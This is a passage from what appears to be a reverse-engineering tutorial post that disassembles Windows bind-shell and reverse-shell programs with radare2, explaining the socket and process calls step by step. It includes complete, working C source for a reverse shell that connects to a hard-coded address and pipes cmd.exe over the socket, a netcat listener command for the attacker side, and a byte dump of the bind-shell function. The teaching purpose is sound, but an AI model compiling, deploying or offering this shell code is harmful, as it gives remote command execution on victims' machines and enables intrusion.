+|     ||    0x0040176a      baffffffff     mov edx, 0xffffffff         ; -1
+|     ||    0x0040176f      4889c1         mov rcx, rax
+|     ||    0x00401772      488b050f6c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408388:8]=0x8702 reloc.KERNEL32.dll_WaitForSingleObje
+|     ||    0x00401779      ffd0           call rax
+|     ||    0x0040177b      488b45e0       mov rax, qword [local_20h_2]
+|     ||    0x0040177f      4889c1         mov rcx, rax
+|     ||    0x00401782      488b05376b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082c0:8]=0x84fa reloc.KERNEL32.dll_CloseHandle
+|     ||    0x00401789      ffd0           call rax
+|     ||    0x0040178b      488b45e8       mov rax, qword [local_18h]
+|     ||    0x0040178f      4889c1         mov rcx, rax
+|     ||    0x00401792      488b05276b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082c0:8]=0x84fa reloc.KERNEL32.dll_CloseHandle
+|     ||    0x00401799      ffd0           call rax
+|     ||    0x0040179b      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|     ||    0x004017a2      4889c1         mov rcx, rax
+|     ||    0x004017a5      488b05ec6a00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
+|     ||    0x004017ac      ffd0           call rax
+|     ||    0x004017ae      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
+|     ||    0x004017b5      4889c1         mov rcx, rax
+|     ||    0x004017b8      488b05d96a00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
+|     ||    0x004017bf      ffd0           call rax
+|     ||    0x004017c1      488b05a06a00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
+|     ||    0x004017c8      ffd0           call rax
+|     ||    0x004017ca      488d0d4e2800.  lea rcx, str.shell_closed   ; 0x40401f ; "shell closed "
+|     ||    0x004017d1      e86a150000     call sym.puts               ; int puts(const char *s)
+|     ||    ; JMP XREF from 0x0040169d (sym.doShell)
+|     ||    ; JMP XREF from 0x00401648 (sym.doShell)
+|     ``--&gt; 0x004017d6      90             nop
+|           0x004017d7      4881c4c00200.  add rsp, 0x2c0
+|           0x004017de      5d             pop rbp
+\           0x004017df      c3             ret
+[0x00401550]&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x00401596      41b900000000   mov r9d, 0
+|           0x0040159c      41b806000000   mov r8d, 6
+|           0x004015a2      ba01000000     mov edx, 1
+|           0x004015a7      b902000000     mov ecx, 2
+|           0x004015ac      488b05c56c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408278:8]=0x84a0 reloc.WS2_32.dll_WSASocketA
+|           0x004015b3      ffd0           call rax
+|           0x004015b5      488985380200.  mov qword [arg_238h], rax   ; [0x238:8]=-1 ; 568
+|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
+|           0x004015c5      b95c110000     mov ecx, 0x115c
+|           0x004015ca      488b05cf6c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4082a0:8]=0x84dc reloc.WS2_32.dll_htons
+|           0x004015d1      ffd0           call rax
+|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
+|           0x004015da      488d0d1f2a00.  lea rcx, str.0.0.0.0        ; section..rdata ; 0x404000 ; "0.0.0.0"
+|           0x004015e1      488b05c06c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4082a8:8]=0x84e4 reloc.WS2_32.dll_inet_addr
+</code></pre></div></div>
+<p>We can see an AF_INET STREAM socket being declared, by now we should already be familiar with those numbers (6,1,2)</p>
+
+<p>So if we look closer, we can see 0.0.0.0 hardcoded there as well as a suspicious number being passed to htons, we can guess it’s the port; 0x115c == 4443dec, so we have the port and the address, and 0.0.0.0 means “all addresses on the box”</p>
+
+<p>Then a bind shows up</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
+|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
+|           0x004015f7      488b8d380200.  mov rcx, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|           0x004015fe      41b810000000   mov r8d, 0x10               ; 16
+|           0x00401604      4889c2         mov rdx, rax
+|           0x00401607      488b05826c00.  mov rax, qword sym.imp.WS2_32.dll_bind ; [0x408290:8]=0x84c6 reloc.WS2_32.dll_bind
+|           0x0040160e      ffd0           call rax
+</code></pre></div></div>
+<p>And as we see the previously created socket loaded with the declared network data gets sent into it, now we can assume that the program will listen there and perhaps accept connections.</p>
+
+<p>And if everything went well, the listen() gets executed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|      ||   ; JMP XREF from 0x00401613 (sym.doShell)
+|      |`-&gt; 0x0040164d      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|      |    0x00401654      ba0a000000     mov edx, 0xa
+|      |    0x00401659      4889c1         mov rcx, rax
+|      |    0x0040165c      488b054d6c00.  mov rax, qword sym.imp.WS2_32.dll_listen ; [0x4082b0:8]=0x84f0 reloc.WS2_32.dll_listen
+</code></pre></div></div>
+<p>We see 0xA being passed to listen, 0xA == 10dec == a maximum of 10 connections will be accepted into that socket</p>
+
+<p>Then accept() gets called</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|     ||`-&gt; 0x004016a2      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|     ||    0x004016a9      41b800000000   mov r8d, 0
+|     ||    0x004016af      ba00000000     mov edx, 0
+|     ||    0x004016b4      4889c1         mov rcx, rax
+|     ||    0x004016b7      488b05ca6b00.  mov rax, qword sym.imp.WS2_32.dll_accept ; [0x408288:8]=0x84bc reloc.WS2_32.dll_accept
+|     ||    0x004016be      ffd0           call rax 
+</code></pre></div></div>
+<p>The socket that is now listening gets passed as a parameter, as we are expecting to receive connections there, our “peer” will initiate the communication,</p>
+
+<p>so accept will return a new socket, that would be used to send data to the client (from this program)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|     ||    0x004016e9      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
+|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
+|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
+|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
+|     ||    0x00401702      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
+|     ||    0x00401706      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
+|     ||    0x0040170a      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
+|     ||    0x0040170e      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
+|     ||    0x00401712      488d45d8       lea rax, [local_28h]
+|     ||    0x00401716      488d55e0       lea rdx, [local_20h_2]
+|     ||    0x0040171a      4889542448     mov qword [local_48h], rdx
+|     ||    0x0040171f      4889ea         mov rdx, rbp
+|     ||    0x00401722      4889542440     mov qword [local_40h], rdx
+|     ||    0x00401727      48c744243800.  mov qword [local_38h], 0
+|     ||    0x00401730      48c744243000.  mov qword [local_30h], 0
+|     ||    0x00401739      c74424280000.  mov dword [local_28h_2], 0
+|     ||    0x00401741      c74424200100.  mov dword [local_20h], 1
+|     ||    0x00401749      41b900000000   mov r9d, 0
+|     ||    0x0040174f      41b800000000   mov r8d, 0
+|     ||    0x00401755      4889c2         mov rdx, rax
+|     ||    0x00401758      b900000000     mov ecx, 0
+|     ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
+</code></pre></div></div>
+<p>So that chunk of code may look complex to analyse, a lot of values being initialized there. We need to be aware of a couple of them:</p>
+
+<p>First of all we see arg_230h, the var holding the new socked (for client communication)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
+|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
+|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
+</code></pre></div></div>
+<p>Being passed to CreateProcessA</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ||    0x00401749      41b900000000   mov r9d, 0
+ ||    0x0040174f      41b800000000   mov r8d, 0
+ ||    0x00401755      4889c2         mov rdx, rax
+ ||    0x00401758      b900000000     mov ecx, 0
+ ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
+</code></pre></div></div>
+<p>SO we can figure out that the process created will relate to the socket.</p>
+
+<p>But what does this has to do with reversing and such? Isn’t that program just very very simple?</p>
+
+<p>Here you have a small hint:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x00401550</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pc</span>
+<span class="cp">#define _BUFFER_SIZE 256
+</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span>
+  <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span>
+  <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
+  <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span>
+  <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
+  <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span>
+  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span>
+  <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
+  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x85</span>
+<span class="p">};</span>
+<span class="p">[</span><span class="mh">0x00401550</span><span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>** netcat can be used here to connect to this bind shell.</p>
+
+<h4 id="the-reverse-shell">The reverse shell</h4>
+
+<p>The thing here is that some firewalls/siem stuff etc will block you from listening on a random port or will alert the user or something like that, so normally you do not want to use bind shells.</p>
+
+<p>The alternative is a reverse shell: making the <em>attacker</em> machine listen for connections on a port (nc -lvp  4443) and just <em>sending the shell there</em></p>
+
+<p>Here’s the code, you’ll see that is prettty similar:</p>
+<pre><code class="language-C">#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+
+// remember to include the winsock lib to the project 
+#pragma comment(lib,"ws2_32")
+
+void doShell(){
+    // initialization
+    WSADATA wsaData;
+    SOCKET s1;
+    struct sockaddr_in hax;
+    char ip_addr[16];
+    STARTUPINFO sui;
+    PROCESS_INFORMATION pi;
+    char Process[] = "cmd.exe";
+
+    // WSAStartup is needed as well
+	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+    // we'll only have one socket in here as we already know where we'll send the process 
+    // WSASocket == socket 
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+    // socket info
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(4443);
+	hax.sin_addr.s_addr = inet_addr("192.168.0.50");
+    // WSAConnect == connect() 
+	if(WSAConnect(s1, (SOCKADDR*)&amp;hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR){
+		    printf("error %d \n", WSAGetLastError());
+			closesocket(s1);
+			WSACleanup();
+    }
+    else{
+        printf("connecting \n");
+        // sui == processinfo 
+        memset(&amp;sui, 0, sizeof(sui));
+        sui.cb = sizeof(sui);
+        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        // and we just send to the socket
+        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
+        // creating a process for cmd.exe, sending to s1 
+        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sui, &amp;pi);
+        // we want to keep it up until the user closes 
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        // house cleaning
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        closesocket(s1);
+        WSACleanup();
+        printf("shell closed \n");
+    }
+
+}
+
+int main(int argc, char* argv[]){
+
+    printf("reverse shell going on: \n");
+
+    doShell();
+
+}
+</code></pre>
+<p>And here we have the disasm:</p>
+
+<pre><code class="language-`">[0x00401550]&gt; pdf
+/ (fcn) sym.doShell 548
+|   sym.doShell (int arg_3ch, int arg_50h, int arg_58h, int arg_60h, int arg_80h, int arg_82h, int arg_84h, int arg_90h, int arg_228h);
+|           ; var int local_28h @ rbp-0x28
+|           ; var int local_20h_2 @ rbp-0x20
+|           ; var int local_18h @ rbp-0x18
+|           ; arg int arg_3ch @ rbp+0x3c
+|           ; arg int arg_50h @ rbp+0x50
+|           ; arg int arg_58h @ rbp+0x58
+|           ; arg int arg_60h @ rbp+0x60
+|           ; arg int arg_80h @ rbp+0x80
+|           ; arg int arg_82h @ rbp+0x82
+|           ; arg int arg_84h @ rbp+0x84
+|           ; arg int arg_90h @ rbp+0x90
+|           ; arg int arg_228h @ rbp+0x228
+|           ; var int local_20h @ rsp+0x20
+|           ; var int local_28h_2 @ rsp+0x28
+|           ; var int local_30h @ rsp+0x30
+|           ; var int local_38h @ rsp+0x38
+|           ; var int local_40h @ rsp+0x40
+|           ; var int local_48h @ rsp+0x48
+|           ; var int local_80h @ rsp+0x80
+|           ; CALL XREF from 0x00401794 (sym.main)
+|           0x00401550      55             push rbp
+|           0x00401551      4881ecb00200.  sub rsp, 0x2b0
+|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
+|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
+|           0x0040156a      488945d8       mov qword [local_28h], rax
+|           0x0040156e      488d85900000.  lea rax, [arg_90h]          ; 0x90 ; 144
+|           0x00401575      4889c2         mov rdx, rax
+|           0x00401578      b902020000     mov ecx, 0x202              ; 514
+|           0x0040157d      488b05f46c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408278:8]=0x849c reloc.WS2_32.dll_WSAStartup
+|           0x00401584      ffd0           call rax
+|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
+|           0x0040158e      c74424200000.  mov dword [local_20h], 0
+|           0x00401596      41b900000000   mov r9d, 0
+|           0x0040159c      41b806000000   mov r8d, 6
+|           0x004015a2      ba01000000     mov edx, 1
+|           0x004015a7      b902000000     mov ecx, 2
+|           0x004015ac      488b05bd6c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSASocketA
+|           0x004015b3      ffd0           call rax
+|           0x004015b5      488985280200.  mov qword [arg_228h], rax   ; [0x228:8]=-1 ; 552
+|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
+|           0x004015c5      b95b110000     mov ecx, 0x115b
+|           0x004015ca      488b05b76c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x408288:8]=0x84b8 reloc.WS2_32.dll_htons
+|           0x004015d1      ffd0           call rax
+|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
+|           0x004015da      488d0d1f2a00.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x404000 ; "192.168.0.50"
+|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x408290:8]=0x84c0 reloc.WS2_32.dll_inet_addr
+|           0x004015e8      ffd0           call rax
+|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
+|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
+|           0x004015f7      488b8d280200.  mov rcx, qword [arg_228h]   ; [0x228:8]=-1 ; 552
+|           0x004015fe      48c744243000.  mov qword [local_30h], 0
+|           0x00401607      48c744242800.  mov qword [local_28h_2], 0
+|           0x00401610      48c744242000.  mov qword [local_20h], 0
+|           0x00401619      41b900000000   mov r9d, 0
+|           0x0040161f      41b810000000   mov r8d, 0x10               ; 16
+|           0x00401625      4889c2         mov rdx, rax
+|           0x00401628      488b05316c00.  mov rax, qword sym.imp.WS2_32.dll_WSAConnect ; [0x408260:8]=0x846e reloc.WS2_32.dll_WSAConnect ; "n\x84"
+|           0x0040162f      ffd0           call rax
+|           0x00401631      83f8ff         cmp eax, 0xffffffffffffffff
+|       ,=&lt; 0x00401634      7538           jne 0x40166e
+|       |   0x00401636      488b052b6c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408268:8]=0x847c reloc.WS2_32.dll_WSAGetLastError ; "|\x84"
+|       |   0x0040163d      ffd0           call rax
+|       |   0x0040163f      89c2           mov edx, eax
+|       |   0x00401641      488d0dc52900.  lea rcx, str.error__d       ; 0x40400d ; "error %d \n"
+|       |   0x00401648      e88b160000     call sym.printf             ; int printf(const char *format)
+|       |   0x0040164d      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
+|       |   0x00401654      4889c1         mov rcx, rax
+|       |   0x00401657      488b05226c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408280:8]=0x84aa reloc.WS2_32.dll_closesocket
+|       |   0x0040165e      ffd0           call rax
+|       |   0x00401660      488b05f16b00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408258:8]=0x8460 reloc.WS2_32.dll_WSACleanup ; "`\x84"
+|       |   0x00401667      ffd0           call rax
+|      ,==&lt; 0x00401669      e9fc000000     jmp 0x40176a
+|      ||   ; JMP XREF from 0x00401634 (sym.doShell)
+|      |`-&gt; 0x0040166e      488d0da32900.  lea rcx, str.connecting     ; 0x404018 ; "connecting "
+|      |    0x00401675      e856160000     call sym.puts               ; int puts(const char *s)
+|      |    0x0040167a      4889e8         mov rax, rbp
+|      |    0x0040167d      41b868000000   mov r8d, 0x68               ; 'h' ; 104
